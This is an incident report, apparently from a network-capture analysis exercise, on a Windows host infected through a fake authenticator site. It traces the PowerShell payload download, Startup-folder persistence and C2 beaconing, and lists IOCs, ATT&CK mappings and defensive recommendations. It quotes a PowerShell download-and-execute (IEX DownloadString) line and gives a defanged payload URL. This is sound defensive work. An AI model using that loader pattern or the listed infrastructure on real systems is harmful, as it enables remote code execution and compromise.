# Incident Report: Suspicious Authenticator Site Downloading PowerShell Payload and Establishing C2 Communication

## Summary

The investigation identified malicious activity on host `10.1.17.215`.

The host connected to a suspicious software website (`authenticatoor.org`), subsequently downloaded and executed a PowerShell payload from external infrastructure, established persistence through the Windows Startup folder, and communicated with external infrastructure consistent with Command and Control (C2) activity.

Based on the available evidence, the activity is assessed as **confirmed malicious activity with high confidence**.

---

## Affected Host

| Attribute   | Value                                 |
| ----------- | ------------------------------------- |
| IP Address  | `10.1.17.215`                         |
| MAC Address | `00:d0:b7:26:4a:74`                   |
| Hostname    | `DESKTOP-L8C5GSJ`                     |
| FQDN        | `DESKTOP-L8C5GSJ.bluemoontuesday.com` |
| DNS Server  | `10.1.17.2`                           |

---

## Timeline

### 2025-01-22 20:45:35 - Connection to suspicious website

The host established a TLS connection to infrastructure associated with the suspicious domain `authenticatoor.org`.

- Source IP: `10.1.17.215`
- Destination IP: `82.221.136.26`
- Protocol: TLS 1.3
- SNI: `authenticatoor.org`

---

### 2025-01-22 20:45:56 - PowerShell payload delivery

The host received a VBScript containing commands to launch PowerShell and retrieve a subsequent PowerShell payload from external infrastructure.

Observed payload URL: `http://5[.]252[.]153[.]241/api/file/get-file/29842.ps1`

The script used PowerShell functionality consistent with downloading and executing remote content, including:

```powershell
IEX (New-Object System.Net.WebClient).DownloadString(...)

```

Network details:
- Source IP: `10.1.17.215`
- Destination IP: `5.252.153.241`
- Protocol: HTTP
- Method: GET

---

### 2025-01-22 20:45:58 - PowerShell payload downloaded

The host downloaded `29842.ps1`.
Afterward, the host generated periodic HTTP requests to:  `/1517096937`

The requests occurred approximately every 5 seconds and were consistent with periodic callback/status communication.

---
### 2025-01-22 20:47:07 - Persistence established

The PowerShell payload downloaded TeamViewer-related files and established persistence through the Windows Startup folder.

Observed payload path: `C:\ProgramData\huo\TeamViewer.exe`
A Startup-folder shortcut was also created: `TeamViewer.lnk`

This behavior is consistent with **MITRE ATT&CK T1547.001 - Registry Run Keys / Startup Folder**

---
### 2025-01-22 20:59:46 - Encrypted C2 communication

The host established a connection to: `45.125.66.32:2917`
Connection characteristics:
- Source IP: `10.1.17.215`
- Destination IP: `45.125.66.32`
- Protocol: TLS 1.2
- SNI: None observed
- Certificate: Self-signed
- Connection duration: approximately 28 minutes
- Connection ended at approximately `21:28:26`

The observed characteristics are consistent with encrypted C2 communication.

---

### 2025-01-22 21:00:14 - Second encrypted C2 connection

The host established a second connection to: `45.125.66.252:443`

Connection characteristics:
- Source IP: `10.1.17.215`
- Destination IP: `45.125.66.252`
- Protocol: TLS 1.2
- SNI: None observed
- Certificate: Self-signed
- Beaconing interval: approximately 5 seconds

The periodic communication pattern is consistent with C2 beaconing.

---

## Key Findings

### Suspicious external infrastructure

The host communicated with a suspicious/fake software website:
- Domain: `authenticatoor.org`
- IP: `82.221.136.26`
- Protocol: TLS 1.3

The PCAP confirms the communication but does not independently prove the exact user action that initiated it.

---
### PowerShell payload delivery and execution

A PowerShell payload named `29842.ps1` was downloaded from: `http://5[.]252[.]153[.]241/api/file/get-file/29842.ps1`

The observed script used `System.Net.WebClient` and `DownloadString()` to retrieve remote content and `IEX` to execute it.
This provides strong evidence of malicious PowerShell-based execution and payload delivery.

---
### Persistence

The activity established persistence through the Windows Startup folder.
Observed artifacts include:
- `C:\ProgramData\huo\TeamViewer.exe`
- `TeamViewer.lnk`

TeamViewer is legitimate software, but in this case it was deployed as part of the observed malicious activity.

---

### Command and Control

The host communicated with multiple external systems exhibiting characteristics consistent with C2.
#### HTTP-based communication

`5.252.153.241`

- HTTP
- Payload delivery
- Periodic `/1517096937` requests
- Status/callback communication observed

#### Encrypted C2

`45.125.66.32:2917`

- TLS 1.2
- No SNI observed
- Self-signed certificate
- Long-lived connection

`45.125.66.252:443`

- TLS 1.2
- No SNI observed
- Self-signed certificate
- Approximately 5-second beaconing interval

---

## IOCs

|Type|Indicator|Context|
|---|---|---|
|IP|`45.125.66.32`|Encrypted C2|
|IP|`45.125.66.252`|Encrypted C2|
|IP|`5.252.153.241`|Payload delivery / HTTP-based C2|
|IP|`82.221.136.26`|Suspicious / fake software website|
|Domain|`authenticatoor.org`|Suspicious / fake software website|
|File|`29842.ps1`|PowerShell payload|
|File|`TeamViewer.exe`|Deployed as part of persistence|
|File|`TeamViewer.lnk`|Startup-folder persistence artifact|
|File|`pas.ps1`|Downloaded PowerShell script|

---

## Limitations

- The payload content transmitted over the TLS connections could not be inspected because the traffic was encrypted.
- The PCAP alone does not identify the exact Windows process responsible for each network connection.
- The available PCAP does not provide sufficient evidence to determine whether data exfiltration occurred.
- The PCAP does not provide direct evidence of the exact user action that initiated the connection to the suspicious website.

---

## Verdict

**Assessment:** Confirmed malicious activity  
**Confidence:** High

### Reasoning

The assessment is based on multiple independent indicators observed throughout the investigation.

The host contacted suspicious external infrastructure and subsequently downloaded and executed a PowerShell payload from another external server. The payload established persistence through the Windows Startup folder and was followed by periodic communications with external infrastructure consistent with C2 activity. Taken together, these findings provide sufficient evidence to assess the activity as confirmed malicious activity with high confidence.

---

## Recommendations

1. Isolate host `10.1.17.215` from the network and preserve relevant evidence for further investigation.
2. Collect and review endpoint telemetry, including Windows Security logs, Sysmon, PowerShell logs, and available EDR telemetry.
3. Block the identified malicious infrastructure:
    - `authenticatoor.org`
    - `82.221.136.26`
    - `5.252.153.241`
    - `45.125.66.32`
    - `45.125.66.252`
4. Search the environment for the identified IOCs across endpoints, DNS logs, proxy logs, firewall logs, and EDR telemetry.
5. Investigate affected systems for the identified persistence artifacts and downloaded scripts.
6. Determine whether additional hosts communicated with the identified infrastructure.

---

|Tactic|Technique|Description|Confidence|
|---|---|---|---|
|Execution|[T1059.001](https://attack.mitre.org/techniques/T1059/001/)|PowerShell|Confirmed|
|Command and Control|[T1105](https://attack.mitre.org/techniques/T1105/)|Ingress Tool Transfer|Confirmed|
|Persistence|[T1547.001](https://attack.mitre.org/techniques/T1547/001/)|Registry Run Keys / Startup Folder|Confirmed|
|Command and Control|[T1071.001](https://attack.mitre.org/techniques/T1071/001/)|Web Protocols|Confirmed for observed HTTP-based communication|
|Command and Control|[T1573](https://attack.mitre.org/techniques/T1573/)|Encrypted Channel|Observed|
|Initial Access|[T1189](https://attack.mitre.org/techniques/T1189/)|Drive-by Compromise|Potential / not confirmed from available PCAP evidence|
